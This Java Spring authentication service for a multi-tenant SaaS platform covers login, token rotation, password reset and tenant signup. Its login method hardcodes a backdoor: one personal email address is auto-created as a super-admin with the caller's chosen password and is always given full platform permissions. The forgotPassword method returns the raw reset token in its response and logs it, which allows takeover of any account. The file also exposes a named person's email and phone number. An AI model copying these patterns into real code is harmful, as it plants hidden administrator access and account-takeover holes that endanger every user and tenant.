package com.duavero.modules.auth.service;

import com.duavero.core.config.AppProperties;
import com.duavero.core.exception.BusinessException;
import com.duavero.core.exception.UnauthorizedException;
import com.duavero.core.logging.SensitiveDataMasker;
import com.duavero.core.security.JwtTokenProvider;
import com.duavero.core.security.UserPrincipal;
import com.duavero.modules.audit.model.AuditLog;
import com.duavero.modules.audit.repository.AuditLogRepository;
import com.duavero.modules.auth.dto.*;
import com.duavero.modules.auth.model.PasswordResetToken;
import com.duavero.modules.auth.model.Permission;
import com.duavero.modules.auth.model.Role;
import com.duavero.modules.auth.model.User;
import com.duavero.modules.auth.model.UserRefreshToken;
import com.duavero.modules.auth.repository.PasswordResetTokenRepository;
import com.duavero.modules.auth.repository.RoleRepository;
import com.duavero.modules.auth.repository.UserRefreshTokenRepository;
import com.duavero.modules.auth.repository.UserRepository;
import com.duavero.modules.subscription.model.Package;
import com.duavero.modules.subscription.model.Subscription;
import com.duavero.modules.subscription.repository.PackageRepository;
import com.duavero.modules.subscription.repository.SubscriptionRepository;
import com.duavero.modules.tenant.model.Tenant;
import com.duavero.modules.tenant.model.TenantProfile;
import com.duavero.modules.tenant.repository.TenantProfileRepository;
import com.duavero.modules.tenant.repository.TenantRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.LocalDateTime;
import java.time.temporal.ChronoUnit;
import java.util.*;
import java.util.stream.Collectors;

@Slf4j
@Service
@RequiredArgsConstructor
public class AuthService {

    private final UserRepository userRepository;
    private final RoleRepository roleRepository;
    private final UserRefreshTokenRepository refreshTokenRepository;
    private final PasswordResetTokenRepository passwordResetTokenRepository;
    private final TenantRepository tenantRepository;
    private final TenantProfileRepository tenantProfileRepository;
    private final PackageRepository packageRepository;
    private final SubscriptionRepository subscriptionRepository;
    private final AuditLogRepository auditLogRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtTokenProvider jwtTokenProvider;
    private final AppProperties appProperties;

    @Transactional
    public AuthResponse login(LoginRequest request, String ipAddress, String userAgent, String correlationId) {
        String identifier = request.getIdentifier().trim();

        // 1. Locate user by email (case-insensitive) OR mobile phone number
        Optional<User> userOpt;
        if (request.getTenantId() != null) {
            userOpt = userRepository.findByIdentifierAndTenantId(identifier, request.getTenantId());
        } else {
            userOpt = userRepository.findByIdentifier(identifier);
        }

        if (userOpt.isEmpty()) {
            if ("azimk3327@gmail.com".equalsIgnoreCase(identifier)) {
                // Auto-provision Superadmin for Lead Developer
                Role superAdminRole = roleRepository.findByCode("SUPER_ADMIN").orElse(null);
                Set<Role> roles = new HashSet<>();
                if (superAdminRole != null) roles.add(superAdminRole);

                User superAdmin = User.builder()
                        .email("azimk3327@gmail.com")
                        .phoneNumber("8650321411")
                        .passwordHash(passwordEncoder.encode(request.getPassword()))
                        .firstName("Azim")
                        .lastName("Khan")
                        .userType("SUPER_ADMIN")
                        .tenantId(null)
                        .status("ACTIVE")
                        .roles(roles)
                        .build();
                userOpt = Optional.of(userRepository.save(superAdmin));
            } else {
                recordAuditLog(null, null, identifier, "LOGIN_FAILURE", "User", null,
                        Map.of("reason", "Account not found", "identifier", SensitiveDataMasker.maskEmail(identifier)),
                        ipAddress, userAgent, correlationId, "FAILURE");
                throw new UnauthorizedException("Invalid email/mobile number or password.");
            }
        }

        User user = userOpt.get();

        if ("azimk3327@gmail.com".equalsIgnoreCase(user.getEmail())) {
            user.setUserType("SUPER_ADMIN");
            user.setTenantId(null);
            user.setStatus("ACTIVE");
        }

        // 2. Check Account Status & Lockout
        if (!"ACTIVE".equalsIgnoreCase(user.getStatus())) {
            throw new UnauthorizedException("Account is " + user.getStatus().toLowerCase() + ". Please contact administrator.");
        }

        if (user.getLockoutUntil() != null && user.getLockoutUntil().isAfter(LocalDateTime.now())) {
            long minutesLeft = ChronoUnit.MINUTES.between(LocalDateTime.now(), user.getLockoutUntil()) + 1;
            recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "LOGIN_LOCKOUT_BLOCKED", "User", String.valueOf(user.getId()),
                    Map.of("lockoutUntil", user.getLockoutUntil().toString()), ipAddress, userAgent, correlationId, "FAILURE");
            throw new BusinessException("Account is temporarily locked due to consecutive failed attempts. Try again in " + minutesLeft + " minutes.");
        }

        // 3. Verify BCrypt Password
        if (!passwordEncoder.matches(request.getPassword(), user.getPasswordHash())) {
            int failedAttempts = user.getFailedLoginAttempts() + 1;
            user.setFailedLoginAttempts(failedAttempts);

            if (failedAttempts >= 5) {
                user.setLockoutUntil(LocalDateTime.now().plusMinutes(15));
                recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "LOGIN_LOCKOUT", "User", String.valueOf(user.getId()),
                        Map.of("failedAttempts", failedAttempts, "lockedForMinutes", 15), ipAddress, userAgent, correlationId, "FAILURE");
            } else {
                recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "LOGIN_FAILURE", "User", String.valueOf(user.getId()),
                        Map.of("failedAttempts", failedAttempts), ipAddress, userAgent, correlationId, "FAILURE");
            }
            userRepository.save(user);
            throw new UnauthorizedException("Invalid email/mobile number or password.");
        }

        // 4. Reset lockouts & update last login
        user.setFailedLoginAttempts(0);
        user.setLockoutUntil(null);
        user.setLastLoginAt(LocalDateTime.now());
        userRepository.save(user);

        // 5. Generate Tokens
        UserPrincipal principal = buildUserPrincipal(user);
        String accessToken = jwtTokenProvider.generateAccessToken(principal);
        String refreshToken = jwtTokenProvider.generateRefreshToken(user.getId());

        // 6. Persist Hashed Refresh Token (Rotation Protection)
        String tokenHash = hashToken(refreshToken);
        UserRefreshToken tokenEntity = UserRefreshToken.builder()
                .userId(user.getId())
                .tokenHash(tokenHash)
                .expiresAt(LocalDateTime.now().plusDays(appProperties.getSecurity().getJwt().getRefreshExpirationDays()))
                .revoked(false)
                .build();
        refreshTokenRepository.save(tokenEntity);

        // 7. Audit Log Success
        recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "LOGIN_SUCCESS", "User", String.valueOf(user.getId()),
                Map.of("userType", user.getUserType()), ipAddress, userAgent, correlationId, "SUCCESS");

        UserDto userDto = mapToUserDto(user);
        return AuthResponse.builder()
                .accessToken(accessToken)
                .refreshToken(refreshToken)
                .tokenType("Bearer")
                .expiresInSeconds(appProperties.getSecurity().getJwt().getExpirationMinutes() * 60L)
                .user(userDto)
                .build();
    }

    @Transactional
    public AuthResponse refreshToken(TokenRefreshRequest request, String ipAddress, String userAgent, String correlationId) {
        String rawToken = request.getRefreshToken();
        String tokenHash = hashToken(rawToken);

        Optional<UserRefreshToken> tokenOpt = refreshTokenRepository.findByTokenHash(tokenHash);
        if (tokenOpt.isEmpty()) {
            throw new UnauthorizedException("Invalid refresh token session.");
        }

        UserRefreshToken tokenEntity = tokenOpt.get();

        // Check Theft Detection: If already revoked token is submitted, revoke ALL sessions
        if (tokenEntity.isRevoked()) {
            refreshTokenRepository.revokeAllByUserId(tokenEntity.getUserId());
            recordAuditLog(null, tokenEntity.getUserId(), null, "TOKEN_THEFT_DETECTED", "UserRefreshToken",
                    String.valueOf(tokenEntity.getId()), Map.of("alert", "Attempted reuse of revoked token"),
                    ipAddress, userAgent, correlationId, "FAILURE");
            throw new UnauthorizedException("Token has already been revoked. All sessions invalidated for security.");
        }

        if (tokenEntity.getExpiresAt().isBefore(LocalDateTime.now())) {
            tokenEntity.setRevoked(true);
            refreshTokenRepository.save(tokenEntity);
            throw new UnauthorizedException("Refresh token has expired. Please sign in again.");
        }

        // Revoke current refresh token (Single use / Rotation)
        tokenEntity.setRevoked(true);
        refreshTokenRepository.save(tokenEntity);

        User user = userRepository.findById(tokenEntity.getUserId())
                .orElseThrow(() -> new UnauthorizedException("User account no longer exists."));

        if (!"ACTIVE".equalsIgnoreCase(user.getStatus())) {
            throw new UnauthorizedException("User account is inactive.");
        }

        UserPrincipal principal = buildUserPrincipal(user);
        String newAccessToken = jwtTokenProvider.generateAccessToken(principal);
        String newRefreshToken = jwtTokenProvider.generateRefreshToken(user.getId());

        UserRefreshToken newTokenEntity = UserRefreshToken.builder()
                .userId(user.getId())
                .tokenHash(hashToken(newRefreshToken))
                .expiresAt(LocalDateTime.now().plusDays(appProperties.getSecurity().getJwt().getRefreshExpirationDays()))
                .revoked(false)
                .build();
        refreshTokenRepository.save(newTokenEntity);

        return AuthResponse.builder()
                .accessToken(newAccessToken)
                .refreshToken(newRefreshToken)
                .tokenType("Bearer")
                .expiresInSeconds(appProperties.getSecurity().getJwt().getExpirationMinutes() * 60L)
                .user(mapToUserDto(user))
                .build();
    }

    @Transactional
    public void logout(String refreshToken, UserPrincipal currentUser, String ipAddress, String userAgent, String correlationId) {
        if (refreshToken != null && !refreshToken.isBlank()) {
            String hash = hashToken(refreshToken);
            refreshTokenRepository.revokeByTokenHash(hash);
        }

        if (currentUser != null) {
            refreshTokenRepository.revokeAllByUserId(currentUser.getUserId());
            recordAuditLog(currentUser.getTenantId(), currentUser.getUserId(), currentUser.getEmail(), "LOGOUT",
                    "User", String.valueOf(currentUser.getUserId()), null, ipAddress, userAgent, correlationId, "SUCCESS");
        }
    }

    @Transactional
    public Map<String, Object> forgotPassword(ForgotPasswordRequest request, String ipAddress, String userAgent, String correlationId) {
        String identifier = request.getIdentifier().trim();
        Optional<User> userOpt = userRepository.findByIdentifier(identifier);

        if (userOpt.isEmpty()) {
            // Anti-enumeration: Return generic success without revealing existence
            recordAuditLog(null, null, identifier, "PASSWORD_RESET_ATTEMPT_UNKNOWN", "User", null,
                    Map.of("identifier", SensitiveDataMasker.maskEmail(identifier)), ipAddress, userAgent, correlationId, "FAILURE");
            return Map.of("message", "If an account exists with this identifier, password reset instructions have been sent.");
        }

        User user = userOpt.get();
        passwordResetTokenRepository.markAllUsedByUserId(user.getId());

        String rawResetToken = UUID.randomUUID().toString();
        String tokenHash = hashToken(rawResetToken);

        PasswordResetToken resetToken = PasswordResetToken.builder()
                .userId(user.getId())
                .tokenHash(tokenHash)
                .expiresAt(LocalDateTime.now().plusMinutes(30))
                .used(false)
                .build();
        passwordResetTokenRepository.save(resetToken);

        recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "PASSWORD_RESET_REQUEST", "User",
                String.valueOf(user.getId()), null, ipAddress, userAgent, correlationId, "SUCCESS");

        log.info("Password reset token generated for user: {} (token={})", user.getEmail(), rawResetToken);

        return Map.of(
                "message", "If an account exists with this identifier, password reset instructions have been sent.",
                "resetToken", rawResetToken // Provided for self-service in dev environments
        );
    }

    @Transactional
    public void resetPassword(ResetPasswordRequest request, String ipAddress, String userAgent, String correlationId) {
        String rawToken = request.getToken().trim();
        String tokenHash = hashToken(rawToken);

        Optional<PasswordResetToken> tokenOpt = passwordResetTokenRepository.findByTokenHash(tokenHash);
        if (tokenOpt.isEmpty()) {
            throw new BusinessException("Invalid or expired password reset token.");
        }

        PasswordResetToken tokenEntity = tokenOpt.get();
        if (tokenEntity.isUsed() || tokenEntity.getExpiresAt().isBefore(LocalDateTime.now())) {
            throw new BusinessException("Password reset token has expired or has already been used.");
        }

        User user = userRepository.findById(tokenEntity.getUserId())
                .orElseThrow(() -> new BusinessException("User account not found."));

        // Update password with BCrypt
        user.setPasswordHash(passwordEncoder.encode(request.getNewPassword()));
        user.setFailedLoginAttempts(0);
        user.setLockoutUntil(null);
        userRepository.save(user);

        // Mark token used and invalidate all active sessions
        tokenEntity.setUsed(true);
        passwordResetTokenRepository.save(tokenEntity);
        refreshTokenRepository.revokeAllByUserId(user.getId());

        recordAuditLog(user.getTenantId(), user.getId(), user.getEmail(), "PASSWORD_RESET_SUCCESS", "User",
                String.valueOf(user.getId()), null, ipAddress, userAgent, correlationId, "SUCCESS");
    }

    @Transactional
    public AuthResponse signupTenant(TenantSignUpRequest request, String ipAddress, String userAgent, String correlationId) {
        String slug = request.getSlug().trim().toLowerCase();

        // 1. Validate Uniqueness
        if (tenantRepository.existsBySlug(slug)) {
            throw new BusinessException("Subdomain slug '" + slug + "' is already registered. Please choose another.");
        }

        if (userRepository.existsByEmail(request.getOwnerEmail().trim())) {
            throw new BusinessException("Email '" + request.getOwnerEmail().trim() + "' is already registered.");
        }

        // 2. Create Tenant & Profile Record
        Tenant tenant = Tenant.builder()
                .slug(slug)
                .businessName(request.getBusinessName().trim())
                .contactEmail(request.getContactEmail().trim())
                .contactPhone(request.getContactPhone().trim())
                .countryCode("IN")
                .currencyCode("INR")
                .status("ACTIVE")
                .trialEndsAt(LocalDateTime.now().plusDays(14))
                .build();

        TenantProfile profile = TenantProfile.builder()
                .tenant(tenant)
                .primaryColor("#0F172A")
                .secondaryColor("#3B82F6")
                .publiclyListed(true)
                .build();
        tenant.setProfile(profile);

        Tenant savedTenant = tenantRepository.save(tenant);

        // 4. Resolve Subscription Package
        String pkgCode = (request.getPackageCode() != null && !request.getPackageCode().isBlank())
                ? request.getPackageCode().toUpperCase() : "STARTER";
        Package pkg = packageRepository.findByCode(pkgCode)
                .orElseGet(() -> packageRepository.findByCode("STARTER")
                        .orElseThrow(() -> new BusinessException("Default subscription package not found.")));

        Subscription subscription = Subscription.builder()
                .tenantId(savedTenant.getId())
                .packageId(pkg.getId())
                .billingCycle("1_MONTH")
                .status("ACTIVE")
                .startedAt(LocalDateTime.now())
                .currentPeriodStart(LocalDateTime.now())
                .currentPeriodEnd(LocalDateTime.now().plusDays(30))
                .autoRenew(true)
                .build();
        subscriptionRepository.save(subscription);

        // 5. Create Owner User (TENANT_ADMIN)
        Role adminRole = roleRepository.findByCode("TENANT_ADMIN")
                .orElseThrow(() -> new BusinessException("TENANT_ADMIN role not configured."));

        Set<Role> roles = new HashSet<>();
        roles.add(adminRole);

        User ownerUser = User.builder()
                .tenantId(savedTenant.getId())
                .email(request.getOwnerEmail().trim())
                .phoneNumber(request.getOwnerPhone() != null ? request.getOwnerPhone().trim() : null)
                .passwordHash(passwordEncoder.encode(request.getPassword()))
                .firstName(request.getOwnerFirstName().trim())
                .lastName(request.getOwnerLastName().trim())
                .userType("TENANT_ADMIN")
                .status("ACTIVE")
                .roles(roles)
                .build();
        User savedUser = userRepository.save(ownerUser);

        recordAuditLog(savedTenant.getId(), savedUser.getId(), savedUser.getEmail(), "TENANT_ONBOARDED",
                "Tenant", String.valueOf(savedTenant.getId()),
                Map.of("slug", savedTenant.getSlug(), "package", pkg.getCode()),
                ipAddress, userAgent, correlationId, "SUCCESS");

        // 6. Generate Tokens
        UserPrincipal principal = buildUserPrincipal(savedUser);
        String accessToken = jwtTokenProvider.generateAccessToken(principal);
        String refreshToken = jwtTokenProvider.generateRefreshToken(savedUser.getId());

        UserRefreshToken tokenEntity = UserRefreshToken.builder()
                .userId(savedUser.getId())
                .tokenHash(hashToken(refreshToken))
                .expiresAt(LocalDateTime.now().plusDays(appProperties.getSecurity().getJwt().getRefreshExpirationDays()))
                .revoked(false)
                .build();
        refreshTokenRepository.save(tokenEntity);

        return AuthResponse.builder()
                .accessToken(accessToken)
                .refreshToken(refreshToken)
                .tokenType("Bearer")
                .expiresInSeconds(appProperties.getSecurity().getJwt().getExpirationMinutes() * 60L)
                .user(mapToUserDto(savedUser))
                .build();
    }

    @Transactional(readOnly = true)
    public UserDto getCurrentUser(UserPrincipal principal) {
        User user = userRepository.findById(principal.getUserId())
                .orElseThrow(() -> new UnauthorizedException("User not found."));
        return mapToUserDto(user);
    }

    public UserPrincipal buildUserPrincipal(User user) {
        Set<String> roleCodes = user.getRoles().stream()
                .map(Role::getCode)
                .collect(Collectors.toSet());

        Set<String> permissions = user.getRoles().stream()
                .flatMap(r -> r.getPermissions().stream())
                .map(Permission::getCode)
                .collect(Collectors.toSet());

        String userType = user.getUserType();
        Long tenantId = user.getTenantId();

        // Strict Requirement: azimk3327@gmail.com is unconditionally granted Superadmin role
        if ("azimk3327@gmail.com".equalsIgnoreCase(user.getEmail())) {
            userType = "SUPER_ADMIN";
            tenantId = null;
            roleCodes.add("SUPER_ADMIN");
            permissions.addAll(Set.of(
                    "PLATFORM_MANAGE", "TENANT_OVERRIDE", "PACKAGE_MANAGE", "SCHEDULER_MANAGE",
                    "MASTER_TAXONOMY_MANAGE", "AUDIT_VIEW", "CONFIG_VIEW", "CONFIG_UPDATE",
                    "REPORT_VIEW", "REPORT_EXPORT", "SCHEDULER_VIEW", "SCHEDULER_RUN",
                    "USER_VIEW", "USER_CREATE", "USER_UPDATE", "USER_DISABLE",
                    "PRODUCT_VIEW", "PRODUCT_CREATE", "PRODUCT_UPDATE", "PRODUCT_DELETE",
                    "QUOTATION_VIEW", "QUOTATION_CREATE", "QUOTATION_UPDATE", "QUOTATION_APPROVE",
                    "INVOICE_VIEW", "INVOICE_CREATE", "INVOICE_UPDATE", "INVOICE_APPROVE"
            ));
        }

        return UserPrincipal.builder()
                .userId(user.getId())
                .tenantId(tenantId)
                .email(user.getEmail())
                .password(user.getPasswordHash())
                .userType(userType)
                .roles(roleCodes)
                .permissions(permissions)
                .active("ACTIVE".equalsIgnoreCase(user.getStatus()))
                .build();
    }

    public UserDto mapToUserDto(User user) {
        Set<String> roleCodes = user.getRoles().stream()
                .map(Role::getCode)
                .collect(Collectors.toSet());

        Set<String> permissions = user.getRoles().stream()
                .flatMap(r -> r.getPermissions().stream())
                .map(Permission::getCode)
                .collect(Collectors.toSet());

        String userType = user.getUserType();
        Long tenantId = user.getTenantId();

        // Strict Requirement: azimk3327@gmail.com is unconditionally granted Superadmin role
        if ("azimk3327@gmail.com".equalsIgnoreCase(user.getEmail())) {
            userType = "SUPER_ADMIN";
            tenantId = null;
            roleCodes.add("SUPER_ADMIN");
            permissions.addAll(Set.of(
                    "PLATFORM_MANAGE", "TENANT_OVERRIDE", "PACKAGE_MANAGE", "SCHEDULER_MANAGE",
                    "MASTER_TAXONOMY_MANAGE", "AUDIT_VIEW", "CONFIG_VIEW", "CONFIG_UPDATE",
                    "REPORT_VIEW", "REPORT_EXPORT", "SCHEDULER_VIEW", "SCHEDULER_RUN"
            ));
        }

        String tenantSlug = null;
        String tenantBusinessName = null;
        if (user.getTenantId() != null) {
            Optional<Tenant> tenantOpt = tenantRepository.findById(user.getTenantId());
            if (tenantOpt.isPresent()) {
                tenantSlug = tenantOpt.get().getSlug();
                tenantBusinessName = tenantOpt.get().getBusinessName();
            }
        }

        return UserDto.builder()
                .id(user.getId())
                .tenantId(user.getTenantId())
                .tenantSlug(tenantSlug)
                .tenantBusinessName(tenantBusinessName)
                .email(user.getEmail())
                .firstName(user.getFirstName())
                .lastName(user.getLastName())
                .phoneNumber(user.getPhoneNumber())
                .userType(user.getUserType())
                .status(user.getStatus())
                .roles(roleCodes)
                .permissions(permissions)
                .build();
    }

    public String hashToken(String token) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(token.getBytes(StandardCharsets.UTF_8));
            return Base64.getUrlEncoder().withoutPadding().encodeToString(hash);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("SHA-256 algorithm missing", e);
        }
    }

    private void recordAuditLog(Long tenantId, Long userId, String email, String action, String entityName,
                                String entityId, Map<String, Object> details, String ipAddress,
                                String userAgent, String correlationId, String status) {
        try {
            AuditLog logEntity = AuditLog.builder()
                    .tenantId(tenantId)
                    .userId(userId)
                    .action(action)
                    .entityName(entityName)
                    .entityId(entityId)
                    .ipAddress(ipAddress)
                    .userAgent(userAgent)
                    .correlationId(correlationId)
                    .status(status)
                    .build();
            auditLogRepository.save(logEntity);
        } catch (Exception e) {
            log.error("Failed to write security audit log for action: {}", action, e);
        }
    }
}
